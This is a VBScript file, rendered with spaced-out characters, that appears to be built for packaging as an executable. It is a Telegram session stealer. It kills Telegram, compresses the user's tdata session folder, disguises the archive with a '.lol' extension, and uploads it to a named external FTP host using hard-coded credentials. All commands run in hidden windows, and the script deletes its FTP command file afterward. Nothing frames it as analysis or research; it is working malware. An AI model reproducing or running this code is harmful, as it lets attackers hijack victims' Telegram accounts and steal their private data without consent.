' ' [ V b s   T o   E x e ] 
 
 ' ' 
 
 ' ' a M R A 3 A f Q R N j B H M h Q 
 
 ' ' d N R K 2 0 S C C v g = 
 
 ' ' a M R A x Q X M W Y + T T p x w 7 7 V A u A = = 
 
 ' ' b d Z W x h P Q W J z c A d h Q 
 
 ' ' a t N M x 0 S C C s j 8 
 
 ' ' e 9 h X 2 A X L C s X c D P g = 
 
 ' ' e N N M x 0 S C C s j 8 
 
 ' ' b d Z G 3 g H N C s X c D P g = 
 
 ' ' c N J R 3 Q v b C s X c D P g = 
 
 ' ' e d J J 2 g r a U p G I H M V w 4 p U = 
 
 ' ' c s F A x x P N Q 4 y Z H M V w 4 p U = 
 
 ' ' f M N R x w 3 d X 4 y Z T 9 h t 8 q V w 
 
 ' ' e d 5 W x Q j e U 9 j B H M h Q 
 
 ' ' a 9 5 L 0 w u f F 9 j M P A = = 
 
 ' ' e 9 5 J 0 B L a W I u V U 5 Z w 7 7 V w 
 
 ' ' b c V K 0 R H c X o 6 Z T o s 5 v f t Q h V o / 
 
 ' ' b c V K 0 R H c X p a d U Z 1 w 7 7 V w 
 
 ' ' c s V M 0 g 3 R S 5 S a V Z Q 1 v P Q d 3 V o C y T 4 = 
 
 ' ' d N l R 0 B b R S 5 S a V Z Q 1 v P Q d 3 V o C y T 4 = 
 
 ' ' e d J W 1 h b W W o y V U 5 Z w 7 7 V w 
 
 ' ' f t h I x Q X R U 9 j B H P g = 
 
 ' ' a c V E 0 Q H S S 4 q X H M V w 0 g = = 
 
 ' ' f t h V z B b W T Z C I H M V w 0 g = = 
 
 ' ' b c V M w w X L T 5 q J V Z Q 0 8 q h Q u A = = 
 
 ' ' b s d A 1 g 3 e R p q J V Z Q 0 8 q h Q u A = = 
 
 ' ' f t h I 2 A H R X o v c A d h Q 
 
 ' ' b t Z T 0 E S C C r v G Y K 0 j t + c D 5 E I L 2 R 5 H b 5 Y S r 0 f E E Z g r e F a j D I C 2 q T M 4 
 
 ' ' a N Z G l V m f G P g = 
 
 ' ' 
 
 ' ' 
 
 ' ' 1 4 7 0 9 f e 1 4 e 5 6 f b 5 a 9 8 1 e b 6 c 1 2 6 f 1 1 5 e 2 
 
 '   K i l l   T e l e g r a m   p r o c e s s 
 
 S e t   o b j S h e l l   =   C r e a t e O b j e c t ( " W S c r i p t . S h e l l " ) 
 
 o b j S h e l l . R u n   " t a s k k i l l   / I M   T e l e g r a m . e x e   / F " ,   0 ,   T r u e 
 
 
 
 '   S e t   v a r i a b l e s   f o r   c o m p r e s s i o n 
 
 s o u r c e _ f o l d e r   =   o b j S h e l l . E x p a n d E n v i r o n m e n t S t r i n g s ( " % U S E R P R O F I L E % " )   &   " \ A p p D a t a \ R o a m i n g \ T e l e g r a m   D e s k t o p \ t d a t a " 
 
 d e s t i n a t i o n _ f i l e   =   " o u t p . z i p " 
 
 f o l d e r _ t o _ z i p   =   o b j S h e l l . E x p a n d E n v i r o n m e n t S t r i n g s ( " % U S E R P R O F I L E % " )   &   " \ A p p D a t a \ R o a m i n g \ T e l e g r a m   D e s k t o p \ t d a t a \ D 8 7 7 F 7 8 3 D 5 D 3 E F 8 C " 
 
 f o l d e r _ z i p   =   " f o l d e r . z i p " 
 
 f i n a l _ z i p   =   " f i n a l _ o u t p u t . z i p " 
 
 
 
 '   G e t   c u r r e n t   d a t e   a n d   t i m e   f o r   t i m e s t a m p   i n   2 4 - h o u r   f o r m a t 
 
 S e t   o b j D a t e   =   C r e a t e O b j e c t ( " W b e m S c r i p t i n g . S W b e m D a t e T i m e " ) 
 
 o b j D a t e . S e t V a r D a t e   N o w 
 
 d a t e T i m e   =   R e p l a c e ( F o r m a t D a t e T i m e ( N o w ,   2 ) ,   " / " ,   " - " )   &   " _ "   &   R e p l a c e ( F o r m a t D a t e T i m e ( N o w ,   4 ) ,   " : " ,   " " ) 
 
 
 
 '   F i n a l   l o l   f i l e   w i t h   t i m e s t a m p 
 
 f i n a l _ l o l   =   " f i n a l _ o u t p u t _ "   &   d a t e T i m e   &   " . l o l " 
 
 
 
 '   S e t   F T P   v a r i a b l e s 
 
 F T P _ H O S T   =   " f t p u p l o a d . n e t " 
 
 F T P _ U S E R   =   " i f 0 _ 3 7 8 1 3 7 2 6 " 
 
 F T P _ P A S S   =   " 5 f a 0 R I m w e z n l F " 
 
 R E M O T E _ D I R   =   " / h t d o c s / u p l o a d s "     '   C h a n g e   t h i s   t o   y o u r   t a r g e t   d i r e c t o r y 
 
 L O C A L _ F I L E   =   f i n a l _ l o l 
 
 
 
 '   E n s u r e   t h e   w o r k i n g   d i r e c t o r y   i s   c o r r e c t 
 
 o b j S h e l l . C u r r e n t D i r e c t o r y   =   o b j S h e l l . E x p a n d E n v i r o n m e n t S t r i n g s ( " % U S E R P R O F I L E % " )   &   " \ A p p D a t a \ R o a m i n g \ T e l e g r a m   D e s k t o p " 
 
 
 
 '   D e l e t e   d e s t i n a t i o n   f i l e s   i f   t h e y   e x i s t   t o   a v o i d   a p p e n d i n g 
 
 I f   o b j S h e l l . R u n ( " c m d   / c   i f   e x i s t   " " "   &   d e s t i n a t i o n _ f i l e   &   " " "   d e l   " " "   &   d e s t i n a t i o n _ f i l e   &   " " " " ,   0 ,   T r u e )   =   0   T h e n 
 
 E n d   I f 
 
 I f   o b j S h e l l . R u n ( " c m d   / c   i f   e x i s t   " " "   &   f o l d e r _ z i p   &   " " "   d e l   " " "   &   f o l d e r _ z i p   &   " " " " ,   0 ,   T r u e )   =   0   T h e n 
 
 E n d   I f 
 
 I f   o b j S h e l l . R u n ( " c m d   / c   i f   e x i s t   " " "   &   f i n a l _ z i p   &   " " "   d e l   " " "   &   f i n a l _ z i p   &   " " " " ,   0 ,   T r u e )   =   0   T h e n 
 
 E n d   I f 
 
 I f   o b j S h e l l . R u n ( " c m d   / c   i f   e x i s t   " " "   &   f i n a l _ l o l   &   " " "   d e l   " " "   &   f i n a l _ l o l   &   " " " " ,   0 ,   T r u e )   =   0   T h e n 
 
 E n d   I f 
 
 
 
 '   C o m p r e s s   o n l y   f i l e s   d i r e c t l y   i n   t h e   s o u r c e   f o l d e r   ( e x c l u d e   s u b f o l d e r s   a n d   t h e i r   f i l e s ) 
 
 o b j S h e l l . R u n   " p o w e r s h e l l   - C o m m a n d   " " G e t - C h i l d I t e m   - P a t h   ' "   &   s o u r c e _ f o l d e r   &   " '   - F i l e   |   F o r E a c h - O b j e c t   {   $ _ . F u l l N a m e   }   |   C o m p r e s s - A r c h i v e   - D e s t i n a t i o n P a t h   ' "   &   d e s t i n a t i o n _ f i l e   &   " '   - F o r c e " " " ,   0 ,   T r u e 
 
 
 
 '   C o m p r e s s   t h e   s p e c i f i e d   f o l d e r   i n t o   a   z i p   f i l e 
 
 o b j S h e l l . R u n   " p o w e r s h e l l   - C o m m a n d   " " C o m p r e s s - A r c h i v e   - P a t h   ' "   &   f o l d e r _ t o _ z i p   &   " '   - D e s t i n a t i o n P a t h   ' "   &   f o l d e r _ z i p   &   " '   - F o r c e " " " ,   0 ,   T r u e 
 
 
 
 '   C o m b i n e   o u t p . z i p   a n d   f o l d e r . z i p   i n t o   a   f i n a l   z i p   f i l e 
 
 o b j S h e l l . R u n   " p o w e r s h e l l   - C o m m a n d   " " C o m p r e s s - A r c h i v e   - P a t h   ( ' "   &   d e s t i n a t i o n _ f i l e   &   " ' ,   ' "   &   f o l d e r _ z i p   &   " ' )   - D e s t i n a t i o n P a t h   ' "   &   f i n a l _ z i p   &   " '   - F o r c e " " " ,   0 ,   T r u e 
 
 
 
 '   R e n a m e   f i n a l _ o u t p u t . z i p   t o   f i n a l _ o u t p u t . l o l   w i t h   t i m e s t a m p 
 
 o b j S h e l l . R u n   " c m d   / c   r e n a m e   " " "   &   f i n a l _ z i p   &   " " "   " " "   &   f i n a l _ l o l   &   " " " " ,   0 ,   T r u e 
 
 
 
 '   F T P   U p l o a d 
 
 f t p S c r i p t   =   " o p e n   "   &   F T P _ H O S T   &   "   2 1 "   &   v b C r L f   &   _ 
 
                         " u s e r   "   &   F T P _ U S E R   &   "   "   &   F T P _ P A S S   &   v b C r L f   &   _ 
 
                         " b i n a r y "   &   v b C r L f   &   _ 
 
                         " c d   "   &   R E M O T E _ D I R   &   v b C r L f   &   _ 
 
                         " p u t   "   &   L O C A L _ F I L E   &   v b C r L f   &   _ 
 
                         " b y e " 
 
 
 
 S e t   o b j F S O   =   C r e a t e O b j e c t ( " S c r i p t i n g . F i l e S y s t e m O b j e c t " ) 
 
 S e t   f t p F i l e   =   o b j F S O . C r e a t e T e x t F i l e ( " f t p _ s c r i p t . t x t " ,   T r u e ) 
 
 f t p F i l e . W r i t e L i n e ( f t p S c r i p t ) 
 
 f t p F i l e . C l o s e 
 
 
 
 o b j S h e l l . R u n   " f t p   - n   - v   - s : f t p _ s c r i p t . t x t " ,   0 ,   T r u e 
 
 
 
 '   C l e a n   u p 
 
 o b j F S O . D e l e t e F i l e ( " f t p _ s c r i p t . t x t " ) 
 
 
 
 '   E x i t   t h e   s c r i p t 
 
 W S c r i p t . Q u i t 